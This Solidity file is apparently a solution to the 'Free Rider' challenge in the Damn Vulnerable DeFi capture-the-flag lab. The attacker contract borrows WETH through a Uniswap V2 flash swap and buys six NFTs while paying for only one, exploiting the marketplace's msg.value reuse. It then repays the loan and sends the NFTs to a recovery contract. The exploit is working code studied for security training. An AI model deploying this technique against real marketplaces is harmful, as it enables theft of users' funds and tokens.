// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "solmate/src/auth/Owned.sol";

import "./FreeRiderNFTMarketplace.sol";
import "./FreeRiderRecovery.sol";
import "../DamnValuableNFT.sol";

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint256) external;
}

contract AttackerFreeRider is Owned, IUniswapV2Callee, IERC721Receiver {
    address private immutable uniswapPair;
    address private immutable marketplace;
    DamnValuableNFT private immutable nft;
    FreeRiderRecovery private immutable recovery;

    uint256 private received;

    error CallerNotUniswapPair();

    constructor(address _uniswapPair, address _marketplace, address _nft, address _recovery)
        payable
        Owned(msg.sender)
    {
        uniswapPair = _uniswapPair;
        marketplace = _marketplace;
        nft = DamnValuableNFT(_nft);
        recovery = FreeRiderRecovery(_recovery);
    }

    function execute(address _tokenToBorrow, uint256 _amount) external onlyOwner {
        address token0 = IUniswapV2Pair(uniswapPair).token0();
        address token1 = IUniswapV2Pair(uniswapPair).token1();

        uint256 amount0Out = _tokenToBorrow == token0 ? _amount : 0;
        uint256 amount1Out = _tokenToBorrow == token1 ? _amount : 0;

        bytes memory data = abi.encode(_tokenToBorrow, _amount);

        IUniswapV2Pair(uniswapPair).swap(amount0Out, amount1Out, address(this), data);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata data) external {
        if (msg.sender != uniswapPair) {
            revert CallerNotUniswapPair();
        }

        (address payable tokenToBorrow, uint256 amount) = abi.decode(data, (address, uint256));

        IWETH(tokenToBorrow).withdraw(amount);

        uint256[] memory tokenId = new uint256[](6);
        tokenId[0] = 0;
        tokenId[1] = 1;
        tokenId[2] = 2;
        tokenId[3] = 3;
        tokenId[4] = 4;
        tokenId[5] = 5;
        FreeRiderNFTMarketplace(payable(marketplace)).buyMany{value: address(this).balance}(tokenId);

        IWETH(tokenToBorrow).deposit{value: address(this).balance}();

        uint256 fee = ((amount * 3) / 997) + 1;
        uint256 amountToPay = amount + fee;
        IWETH(tokenToBorrow).transfer(uniswapPair, amountToPay);
    }

    function onERC721Received(address, address, uint256 _tokenId, bytes memory)
        external
        view
        override
        returns (bytes4)
    {
        if (nft.ownerOf(_tokenId) != address(this)) {
            revert();
        }
        return IERC721Receiver.onERC721Received.selector;
    }

    function sendNFTs() public {
        bytes memory data = abi.encode(address(owner));
        for (uint256 i = 0; i < 6; i++) {
            nft.safeTransferFrom(address(this), address(recovery), i, data);
        }
    }

    receive() external payable {}
}
